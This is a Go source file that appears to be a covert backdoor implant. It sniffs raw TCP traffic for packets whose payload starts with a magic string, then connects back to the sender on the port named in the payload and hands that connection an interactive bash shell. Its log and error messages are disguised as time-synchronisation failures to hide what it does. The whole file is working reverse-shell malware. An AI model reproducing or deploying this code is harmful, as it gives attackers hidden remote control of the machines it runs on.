package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"sync"
	"syscall"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/rvolosatovs/mooshy"
)

func main() {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		log.Fatalf("Failed to start time syncronisation: %s", err)
	}

	f := os.NewFile(uintptr(fd), fmt.Sprintf("fd %d", fd))
	defer f.Close()

	wg := &sync.WaitGroup{}
	for {
		b := make([]byte, 1024)
		n, err := f.Read(b)
		if err != nil {
			continue
		}

		p := gopacket.NewPacket(b[:n], layers.LayerTypeIPv4, gopacket.Default)

		tcp, ok := p.Layer(layers.LayerTypeTCP).(*layers.TCP)
		if !ok || tcp == nil || !strings.HasPrefix(string(tcp.Payload), mooshy.MagicNumber) {
			continue
		}

		ip, ok := p.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
		if !ok || ip == nil {
			continue
		}

		addr := net.JoinHostPort(ip.SrcIP.String(), strings.TrimPrefix(string(tcp.Payload), mooshy.MagicNumber))

		wg.Add(1)
		go func(addr string) {
			defer wg.Done()

			conn, err := net.Dial("tcp", addr)
			if err != nil {
				log.Printf("Failed to sync time: %s", err)
				return
			}
			defer conn.Close()

			cmd := exec.Command("script", "--quiet", os.DevNull)
			cmd.Env = []string{
				"TERM=xterm-256color",
				"SHELL=/bin/bash",
			}
			cmd.Stdin = conn
			cmd.Stdout = conn
			cmd.Stderr = conn

			if err = cmd.Run(); err != nil {
				conn.Write([]byte(fmt.Sprintf("Failed to start shell: %s", err)))
			}
		}(addr)
	}
	wg.Wait()
}
